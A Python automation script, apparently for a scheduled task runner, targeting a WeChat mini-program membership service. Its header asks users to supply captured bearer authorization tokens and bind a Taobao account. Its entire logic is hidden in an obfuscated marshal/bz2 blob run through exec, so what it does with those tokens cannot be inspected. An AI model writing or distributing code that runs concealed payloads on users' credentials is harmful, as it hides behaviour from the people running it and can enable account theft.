'''
vx小程序 -- 所有女生会员服务中心
抓包域名 7.wawo.cc 下的authorization 只需要填写 bearer 后的数据
export synchd='authorization1#authorization2" 多账号使用 # 隔开
cron: 8 8,12 * * *
Tips: 需要自己手动开一次红包绑定淘宝账号
'''

try:
	import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(bz2.decompress(b'BZh91AY&SYO\xfa\xbe\x10\x00\x02\xdc\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\x08\xff\x1e\xf7\x95\xef\xb9\xeb\xba\xde\xcbx\xef}\xbe\xd7\xbd\xbb\xef\xbaj\xf5\xe7\xdd\xdf}\xdeo\xa7\xdfo\xbd\xb7e\x1f\xa5?)<S\xf4S\xf2\x13)\xfa\xa6\xca{B\x9f\xaao\x14\xd4\xfd\x1aj\x8c\x9a=\x1912yI\xbdMG\xa6\x93\xd4\xfc\xd4\x985G\xa7\xaay1\xa2\x9f\xa5?Jx)\x93\xf56\xa7\xa2\'\xa9\xa3\xda\xa7\xe4\x93\xda\x1aS\xc0MG\xb5=&\xa7\xa6\xd5=M\x8ax\xa6OM\xa4\xc6\xa7\x89\xaa~E=\x8a\x9e\x02i\xb4\r#\xc8\xca!0\x10\xcd5<\x84\xd3ODm\t\x93\'\xa0\xd4\xf4M\xa6\x9a\x03M\x13&\x13OQ\xb4\x04d\xd3&OD\xd3#\x1a\x98C2\x13i6\xa0\xc1\x0cM\xa6S\xd12`\xd4z5=L\x08\xc9\xe8\xd2l\x9a\x86\x13OH\xd1\xa3\x10\xd3ji\x84\xc2i\xa0\xeaa<\xa7\xa9\xa7\xa4\xf4dOS\xd3D\xc4\xc0\xd2i\xa3\x00\x13\xd4\x0c&\x04\xc9\x8dF\x86M=L4\x9bBlM\x19\x01\xa3@\x8c\xd1\x93I\xe8\x99\xa12mM\x0c\x9a4\xc9\xa6\xcahdcQ\x824\x06i\x1a6\x91\xa1\xb5\x1bS\x11\x91\xa7\xa9\xa1\xd4\xda\x8fH\xd1\xa6F\x9afI\x9aj\x18\x98d\x99\xa9\xea=M?TzF\x98\x8f&F)\xedMCM\x93\xd5=G\xa4\xf2\x991\x1a\x06M\x1e\x99FG\xa8?POQ\xea4\xd0\xc9\xeaz\x9e\xa0\x07\x94d2\x1eS\xd4\xd0\xd0=OP\xd04\xf1#\xd4\xf5\x06#\xd4\x003SD\x9eP\xc8i\xeamA\xe9\x1a\x19=&\xd3OS\x11\xe8\x8fJd\xf2i<\x9a5\x03M\x1amF4#\x13h\x8d6P4\xc4\xcd#M\x1eS&\x83Cjz\x9e\xa6&\x8d\xa1=OSA\x93\xd4l\xa0d\xd3&\x83L&\x86i=C\xd4z\x9azA\xeabi\xa7\x8ah\xd0`M\x113&SLj{H\x9bM\'\xa4\xd3\xd4y\x19LM\x1az\x13F\x99\x06jm5\x1e\xa6\x04l\xa6j6SC\'\xa8\x0fS&\x9a\x03\xd4\x1a\x1ah\xd3 b\x1e\xa1\xb5=\x13&&@\xc8\x1a\x03@4\xd1\x9aL\xd3P\xc9\xa6\x8c\x9bP\xd3@\xbaL\x18\r\x02\x87\x99"B\x081\xc0\x14\x08\x10H\t\xed\x13<m\xf8@k\x82\x83\x94o$:=\xb18\x00\x9a\xa0\xa4\x1e\x0b\xeb\x14\x8a\x19\xce$\x87N\x93\x0c\x88\x9a\xc1\xddA\x91\xe0\x84\xa1\xbc\xb7\xd7\x12 \x00\xf3\xae_\x83\xba\xf7\xc5Z\xa3\xe9\xe0mm\xe7\x8b\x14&\x19>6\xcf,y\x1a\x04\xb0\x99\x07T6\x8d\x8f\x84\xdf^\x98\x1d\x12V\xbd]E\x94\\v\x03\xfa\xf5V\xf5\xf3W\xd4,\x9c(\x1c\n\x83R\x14\xba\xc8\xa9\x8c\xe2:c\x8e\xd9\xf2N$\x88\xdd\xa5!e\xf4.\xd1I\xf0\xbfr\x9c\xd9\x84\xa2{.\xd1\xbf\xda3\xd7\n\x8eH\xdb\x9exA\xe0\xbf\xd7\x1b\x02\x0c:\xce\xfa\xb1n\xb0e\x99\xbf\xa8\x80[\xecz\x93P\x0bJ6Q\xaf\x05\x867\x0b\x1a\x9c\x9aB\x9dIE%\xd7\x19\x00\x17+%\xe0m\x00a=\x19\tW\x14\xbe\xb8\x08\xba\xcc\x94\xd2\x17\x87\xd6\xc9Xt\xc5\x95`[\x8f\x0e\x8c\xaf\xbfu\xe6s\xa9\x16{X\xf6\xf8\x85\x9f\x93\x84\xc54\xa0\x9c.\x9c5-\x89\xbfrdJ\xc1\xf6\xf8=\xd9`\xdb\xd4\x1c\x82>\x8d\xa8R\x8f\xe7\xcai@l,\xc3\xf1\x19\xe12\xec\xfdKg8\xb2\x18\xe6\xe9\x02I\xc0\xa7\xb2#0?\xf6\xa2\xd8[\xcd\x84U\x0c\xc0BVT\xd1\xce"L\xaf\xf5\xac\xf5\x92\x90\xb8\x9e\\\xddi\t\xca4&\xdff\xb6n\xd5T\x91\xa81\xec\xc7o\x11\x0c\xd3G\x9e\xe6r\x82\xe1q{}d\xa8\xdel\xb6(\x824XO5\xdd"\xbc]1j\xbe\x02bq\x08\x1b\xea\x83\xd1\x95i\xb4v\x00N\xc6\x82\x12\xca}\xfe\x9ft\xa0J\x95+WR\xc8%\x806\x16\xac\xa7_\x94S9\x92\xed\xa7\x1fP\xe8S5q\x94\xa3]\xbf:\x0f\xc7\xf6|I\x86mm\x85}\xd2S\x9d\x84\x87\x97\xd6\x9dR5A\x85\xa8\xd2\x91\xef\xb3\xefl\x8a\xb0\x14\x91\x8b\x12k\x936EM\xa6\x88\x97\x05\xdeY\xc090\x13\xd1\xa7\xa1\xed\x0c\xc2\x85\x1al\xd9H"\xd5E,\xe8\x89\x84\xeb\xd3\xbf\xc2\xea\xd88+\xb2F\xa7\x021\xb5,\x96\xc5r\x0c\x14\x15\x15\x90#1\xb3\x96\x9a\xed\x9b\xafm\xff4S\xe1T\xef\n\x0c9\x9a\xc0\xc5O1}\x1c?o;\xf4\x14\xcbK\n\x9b\xc2nX4nQ\x0c\xe4\xe2\xcfC\xef\xcf\xd0\xa9Fne\xa7\xf0V\x1c+\xa9\xd0g\xa8<\x88\xecn\xcaBI\x90\xf7\xd4\x17Z\xae8K,\xe3\xb0\xb9\xec\x90V@\x95!\x95\xd0v\x91e\xba\x84\x89\xe6\x16\x129\x7fh\x8b\xc8;BnQ~\xaa\xbe\xe4\x83\x14\x83\xa9_\x1b\x17\x9e\xb0\x92x\xf0\xde\x1aE\x82\xc8\xdao>r\xb1\x11\xf4\x068-\x82\xbd\xa4\xd9\xb2J8\xc9\xf1\x85S\xd9AS2\xe2\xcb\x8c\xd4\xd8\xc65\x0b\x87\x83*\xce\x0b\xe1\xe6F\\,\xf1\xc4xw\x0f\xcd\x83\xb8c\xa4\xb0\xc6\xdf\n&\x05e$\xab\xe92}\xad\x86\n\xfd\xfa\x14\x8f@-5\xfc6\xa4S\x06\x8bV\xe4@&;\xd4\xd6s\xd1h\xa9\xb4\x9a\xb9\x1cz\xefLP\x86\xf0\x05(i\xd8\xe5"\xe3\x11\x88*v\xeaQG\x8cgJ \xda?s3\xf7B\xc6\xa5\'4\x10\x04\x00{Z\x965\xf8\xc5\xdb\xe8\xf9\x12\x06kh\xf6\x8cj\xfc\x92\x00\x9f\xdf0nYW\xac\x8e\xd28\xc3}\xc7\xeeK\x02O72\x00}h\x95\xc63\xe7\x90\x05Ns:\xd4\x0c\xcb\xfay\x8dn\x95{\r\xd0.\x86b\xba@\'9=\x0f\x17\x11jC:;C\xb8\x00}>{\xb1_\xe7FN@"\xc3\x88`\xec\x12\x84\xef8\x1at\x9a\x90\x95e\xb9W\x18\x00\x9b\x9eA\xf4\x16\x00A\xa6\xe6$.\xdf\xcd\x0f\x14\x8c8\x133\xb9\xf1\xa7\x03\xb5\xac#x\x12\xb7\x0c\xcd\x86\x86>j\\BU\x18\xfb\\\xecTWY\x04\x9cY\x8c\x02\x857R\xbcT\x9b\xdaN2\xed_)D\xecX\x83\x93\x8d\xfa\xf0Y\xa0b8\xd9\xf1\xc4\xd5\x89Cp\xa4\x83-N\x9b\x94\xa3\xd7\x06SZ\x85;\xbe\x0e\x9f\xbb\x05\xd8\x8bXe\xf9\xa4T?\x88\x19\xfa\xa1d\xa5\x84\xb2\xfa\xfe\x10\xea0>z(\x168m9M\rD\x0e\xbc\x85\xae\xd0S\x12\xb7E\xba\xa32\x82\xed]\xe5\xbd\x9c4\x97\xe3\x8a<f\x9ch>0\xbbz\xdd\t\xe50UB;\xb3r\xc0\x08\x10\x947z\xe8=\xead\x0e \xaa\xff\xf3\xa1\xfb\xe8s\x06\xfb\xc7K\xdc\\\xc6\r\xc5\x19 \x13\x06\xa0\x00\xea\x0eX\xdc\xc3\x8f\xa5(Z"\xd1G\xb0\xf2-\x80\x96\xdaLW\xa9\x1d\x00\xacN\ng\x113\xab;d\xce\x8d]d\x12~;\x82\xf4\x01\xa5\xd0\xd5\xa8\x9a\xd7B\xb8\\\x97\x17_D\x85\x9f\x8dS\xebr\x11#\xc2+\xd1\x0c\x8b\xfd\xc6\xff\x0fU\xed\xd1KK\xd6\xe6\x7f\x89N8A\x18\x0f\x004;YTbd\xa4X\x16\xb3Q\x03Q\xbe Rv\xaa\xf8\xf4\xeb \xee\xa8YaiKn\xce\xd4 \xbe\xb5\x94\xbd;nN\xd4\x1f\xf1!\x08\xa9\x95\xe1\x8f\xab\x13\x16\x16\xa69\x98\xa4\xf1\xe4\xb1\x0e\x86Yh\x1f\xb4i"\x8a\xafa\xe9\xc7\xb2\x8b~\xee\x03O\xaaX4D\xfb\x12\x98\xb1\x83\xc0*\x1c\xe2\x16\xe1\x17\x83\xb4_^\x05\x04\xf0\x1c\x9e\xd9\xc8H\xa2\xb8\x08\x18\xcc\x8aN\xfb\'\x85\xca\xf8\xa8\x1e\xc1\xcaD\xd5rx\x9dN\xcf\xfa\xa64k\xcd\xfe\xab#f*|\x88i\xc0N\xb59C!\xf0(\xfdi4\xbd\xbb\xeb\x00\x92V\xfa\x16\xb7F\x13\x8f37\x93d\xab K\xd0\t\xf3\x1d\xa6YCI.\x8di\xac\x1f\x95;\\\x1f*\x82\x14\xac01\xd1/Pc\x8a\xc5.9w\xebG\xed\x13\xe1\x0cEF\xf3\xe2\xbbZ\x07\xd2\xd6m\x8310\x93\x91\x00\xbc\x9btx\xe0A+Pg\xb5\x03\x177\xeb\xa2V-\x8b\xda\x9cAk9)\xfb7T\x0b\x93\xfd\xd6\x9br\xc1\xcbG\x92a\xff\xe8r\x1e\xc4\x86\xf2\\\xf3\xfb\x9e\x11{Uo\x8c\x1f\xe8W\xc8e\x1bU\x0bF\x909\xe6\x9e\xd4"\xbb\xef\xa6\x81\xe2\x0e_\xe4uy\x8b\xae\xa8\x82<\xd2h\xf3\xd2\xf4\xb2!\xb5D\x03\xeb\x98\x14\xb0\x96\xe2eR&\xb0\xaa\x01N\xe0\xa7\xc5\xc6\xc9\xed\xe5\x95\xd5\xa3d_\xe4m\x80\xe9\xf9"R\x16\x18\xcb\x12\xe1\xaf\xe8\xff\'Z\xa8\xa5\xfe\xc2\xcc\x85\xb7\xb69&\x004\xea\xa04\x84\xaa\xcc\xc6J\x9f\x81\xf3\xad6mJ\x9c\x1a\xd1\xb4 cS\x13\x99\x8d|\xd5\xbf5\x0bh9\xf9N\x8a\xa5\xa2\x0b\xce0#\xe0\x18\xc0\xc7\xdc\xca\xad\x05\x90dw\xbe\x07\x8d\xf6rR\xf1]\xce*QN\xdbJ\xe8\xfdY\x10\xfa\xc2\xc8\xbb]\x19\xa1\xadO\'K\\\xbempHD\x0c6\xd2A4"\xe1\x99\xfe{\xdc>Re\xdd\xea^\x18I\xa3Oi\xba\xa7\xb2\xd5mJX\x8e\x85\xb62N\xdamB\x9c<\x96\\\x8ahv\x96.z$?\x0b\xf9g\xcb\xddh\xf0\x98\xb7\xb9q\xb1\x8a\xeb\xce\x8az\x8fa\x86\xd9kIx\xff\x9e\xa0\x93\xf2\x99\xddL\x1f%dEw\x00E+\xdb]\xae7\t\xb6\xaf\x0c\x8eQH\x04\xd8\xf1U\x030\x8cWV\xebo\'\x0e0\x18\xd4\x95\xa3\xb6L\xd2\x9b\x8e\x87\xeb\xf1\xee\x83\xa7\xa6\x8a\xec\x80\x08\xbcDK]\xc5\xe9_\xcb\x83\xa6=\xce\x94*\x07\xfd\xc4O\x84d\xad+^\xea\x8cH\xb3=\xa68rn\x95\xd3\x93\xb2Yz\xd3`\xc1\t\xd4\xa9\xae\x11\x0eu\xd1\x90\x9b\x81\x9c2\xde\xa2\xb4a\x91\xc1\x0cjd\x01WS}|a\xe4D\x0b\x91?\xf7\xef]\xd2<\xd0\x19?a\x1dt\xa2\x96\xab\x1c1\xb6\xbc\xa4\x92\xf3\x96\x16$\xea\xd3@\xba\xbc\x85u#\xae\xb7"\x11\x7f\xb2E G\xedG\x8b\r\xc3e\\\xf7\xd0\xc3\x02\x16:\x047\xda\xbd\xc0\x16\xe1\x1d\xf6\xd35L\xee\x95\x92\xdcX]\xea\xe4\x95h\xb8\\\xab\x89\xcf,E0\xeb]\xbc\xd0\xb6\xe6\xa5FQYQ{jZ\xa6[\xac\x16\x0c\xd7}\x8d\x04\x06\x0eSf\xa0\x92\x94\x81ZV\x86\x1e\xe0\xaa\x89S\xf5V4\r\xb1:<y\x9a\x0eWp\xb0W\xac|/U\xbeR\xb5kT]U_\x86\xc4+\xe6\xa7\xe55O\xb4T\xb5zz\xab\xf9\xd6^-G\xb1\xf2\x1c}\xf9\xa2\t{\xb9;\xcc\xf9Y\xf9\x16Q\x1b [\xacnr\x7fY\x06\xce\xc0\xfbk\xd1n>>s\xbck\xbe\x1e\xac\xcfBM;\x83k\x98\x87>j\x9bbw\xb3\xd0:\x931\x10\n\xf2\x01\x1aP\xea\xe3\x96!b\x99W\x11U\xd1)\xe7\xa0\x88\x18\xdc\x85\x17u\x0f\xdf\xd0\x9e1\xfa\xa2\x88JZ\x995J\xfd\xf7\x87\x9b\xb2F~\xb9\x7f\xb6\xbf4q)\xc5\x0e\xd8e\xdfK\x85>\xd5;\ttLMB\x10)\xd7\xf8\xea<\x05\x9d\x03"\xca/\xcf\xc4\x0ee\xd2\xa1\\#\xfcf\xca^6[\x14\x0c\xa8w\xcfVC\x94\xcd\xdd\x8a\xc5\x1b1\xd1\xf6\xa4>^G&\xd7\xf3\x8b\xcd\xa4oL\xc2\x0e\xcc\x9dH\x0f\x00N\x99\xe0\x95\xa0\xfcB\x01\xe2\x92\xb8\xeb<\x17\xb4\xb3\xafy!\x08Y\xe8 \xd2\xce6\xf1U\x17\x07\xcc\x06i\x13\xc5\x90~d\xb5\xf2U9\xa4\xd5\x1d\xd9\xe3\x8e`\x89\x163\xf7K\xd0\xc7\xe7\xd6\x1d\xb6\x9f\xe7\x87\xdbB\xd0\xbbj\x80\xbb\xbfSj\xb1\xc8#i\rw=zc\xd8\xf6\xd1S\xfe\x7fi\x07:B\x19Q\xd0iY#lcmD\x06GL$\xa0f\xb2T\xfa\xc4M\xd2\xdc\xa7\x9f\x92\xae\xb3\\\xc4\x18\x87\x0e\x98\xfc<\x9f\xa3\xbf\x9cdU\xb4\xf8\x86\x1f\xa1\xe7\xe62.e\xf7\xf2\xe5:\xad]\xc9\ngU\xdd\x8c\xbf\xa0\xc2\x9av\xd6EKW\xcd\x19\x17\n\xc5\xe3\xfb\x95\x85\x82B>\xf1X\xb1\xd9\x87\xad\x1bx\xb1\xabOk\xdd\xc7\x80\xf8j\xb3\x0e\xd25\xcf\x1e\x8e\xd1\xc4\xc42><3\x12\xf5u3c\xf6\xe0\x0f\x82\xdd)U5D\xb0\xbc\xb0"\xe7\xf2M\xe0\xb2\xf4\xd30\xf2`\xdd\xadQr\xc5\xa7\x89\xdc\xde1\xa8I\x198\xbd\xc0\xd7b\xe6\xadO5b\x13H\x96\x9d\xb9r\x85G\x8f\xb6\\\x99\xc51\xc8v\x14#2\x08\x0c}2`\x9cv\x0bwt\x02E\xeb\xb1\x06\xf0\x10DX2s\xa3\xd8\xba\xd3e*\x8a\x06W1\x165\xcc\xdaQ)\xdb\xe5\x97\xdc\xdf\x8c\x98\xba\x95UC^\xa9\x93\xd9\xd7[Ma\x92\x7fw\xee\xbb\xben5l\xe7]\xdc\xfbo\xd69\xc687\x9a0GrR<+\x12\xe8%e \xf8O\x0b\x97\xf0\xd8XA\xb9\xa2\xa7Z\x88\r\xa1\x10\x15C\x18\x8e@\x88O\x9b\x90\xdeyu\xa1\x83\xda\x17\xb6\xd6\xbd\xac\xdc;\x1f\n\xbao-\xf6\xb1r\xb8\xc1\x07\xac\xb3%\xe6\xdfg#\xe2\xa5\xd1#\xb6\x8d+u\xd2\x8c\xdc\xd8M\x06\xf9\x93#S[\xec\x15:A\x85\xb2\x1d\x1f\x0e/\x7f?\xe7\x1f\x17\xa5\x01\xa3\xea\xb7q\xf1o\x07\x83\x87\xb6\x91\x1d\x05(\x17\xdf\xa4\xb3\x82\x93\x99c)\xae\xaa\r"%V:n\x98\x8c\xedi\xbfS\xb2:=5\x88\xf3\x10\xb5\x91\xd1\x8b\xaf\x0ey\x16\xfb\xd34[\x08\xe2\xed\xe2\xce\xe6\x8b\xa7S\xe6\x9c\xef2\x9e\xa7I\x10\x9c\x81\xfas\x18\xa8\x02\x81\x0c|\xd7\x0b\x8e\x9a\xfb0R\xb0\xbev\x91\x07C1 \xa1\xc9O+\xea\xa3\xaf$|\xe7E\x16\x1c\xe4@\xd2\xadL\xa7t\xf8\x97\x126\xc03@6l\xf7\x13\xa4\xa5\xc6hW\x83\xc2\x9b\xbe47\xcd\x15\x9d\xd4\xcb\xc7G\xa7\xb7\x8b2g\xb4H\xa5,\x13\xf3\xc4\x8d.\xe8t\xb4\x99\x9f-\xc44j\xc7\xbb\x11P\x07\xf4t\x1b\xf8\x85\x17\xb1C-\xd7\xf5N\xa0\x0b\xfda\x0cT\xa4\x83\x91\xaa\x9b\xe8\xc14\xb7\xe8.b\xba^\xea\xb5\x8eM\x83\x14\x12\x06\x15\x95\x0f\xce\xeax\x87x\x84E]c\xb1w62\xa8\xf2\x1a\xf2\xc1\x0e\x05\xd3=\x1d]:\xec\x10 \x96B\x97qgW\xd71\x1d,eF\x90\x86+\xed.\xc5\r\xce\xd5\xe1\xda\xbf\x0e\xb2\xaf\xf7(\xa4\x85\x7f4\xab\xe6(\x95D \xf8 \xb23Vk\x13\xfc\xff\xba+8\x0bT\x9d\x0e\x14\xd2\xf9\xfa\x9b\x9c\x98\xe1\xb7\x9d\xd4\x9c<\xf9\x91z\x05Sog\x82\x02\r\xbb>\xc7\xb5Y%\xa4p\x8cK\xc0@"\xdc\xcf\x81q5F\xb7\x98#\xf0>1\xd3 W-%\x9ejUj\xeb\xc20\xd5l\x06\xa5\xd1\nx~\x0c\x8f\xcb~SN\xf3\n\xe4\xbaF6\x01\xeaK\x84\xe6\x1b?P\xceR\x86\xeb\x17\xf3;\xe9\rO\xc9Z\\\xfb\xaf\x1a\xa1\xdeo\xd1\x0c\xfc\x86\xdaA\xc5\xe0\x13ca\xb6p\x1f\xc0\xd1\x11\xf5K\xff\xc0B_\x1e+e\xdb-\xc6\x1e/\x18\xdb,\x94$\xf5J\x1c\xe7G\x83\xc3\xdbsf\x0bO4FUf\x0c^*\x1a\xe2h\xc2\xd1\xf5\xc6\x0cA0\x88t\xd2\xf6F\xb5\xfe\xfe\xba)\xd1y\x12&\xeb\xa7\xbb\x91\xc6\x9f\xef\x8as\xe3J\xe7w\x99\x88\x08\xc5\xf35\x90\x82\xb5\'@\x80\xb0\x0e\xcc5\xa0\x10\xdc&\x0e;\xdbf5\xbeT>E\x1f\xa7HG\x86\xaek7t\xf7}\xf3w\x8b\x8bU\x07]\x01\x8b\x15Tr\xf9+)\x10\x9f\x06C\x17n\xdc\xd1H\x8cz\xb9\xa8t^[\xa2#\x85\xf9or\x9b\x00C\xaco\x11-\x03Y\x82\x13\xe8\x05\xaf\x911\x12\x07\xa9\xcc\xb4\x9d\xb1\xe6;c\xe0aX\xef%B3\xecH6i\x9d\xe0\xbd,\xbc@\'\x142\xa3\xb9L\xe5\x9c\xbe\xdb6\xd4\xa5\x87j\xd9\x80\x84X\xd2\x8e\x92@z4\x13\x8e\xb2A\xa8\xb5\n\xa7\xc9I\xe0\x1c~/*\xdf9\xa4\xc1L\x1c\xc2&)\x1e\xbeu\xe2\xb5\xeeY\xd7\x9bpf\x90\xba\xcc\xcck\xffk\x93kG\x92>x\xd2]\x0b\x11\x95w\x06g\xaa\x17\xc0@\x95T\xb6g_z<\x8eO\x01@\x18>f\xea\x13\xf7}S\xdd\x96\x9a\xeac\x83\x17yjfi\x97\xa5\xe8e\xf9\xc5\xdc\x91N\x14$\x13\xfe\xaf\x84\x00')))
except KeyboardInterrupt:
	exit()